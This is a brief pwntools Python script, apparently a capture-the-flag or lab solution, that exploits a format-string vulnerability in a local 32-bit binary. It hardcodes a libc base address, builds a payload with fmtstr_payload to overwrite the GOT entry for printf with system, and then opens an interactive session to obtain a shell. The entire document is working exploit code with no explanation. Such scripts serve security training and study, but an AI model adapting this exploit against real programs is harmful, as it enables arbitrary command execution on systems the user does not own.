from pwn import *

elf = context.binary = ELF("./got_overwrite-32")
libc_base = 0xf7d74000
libc = elf.libc
libc.address = 0xf7d74000

got_offset = 0x804c00c
p = process()

payload = fmtstr_payload(5,{elf.got["printf"]: libc.sym["system"]})
p.sendline(payload)
p.interactive()
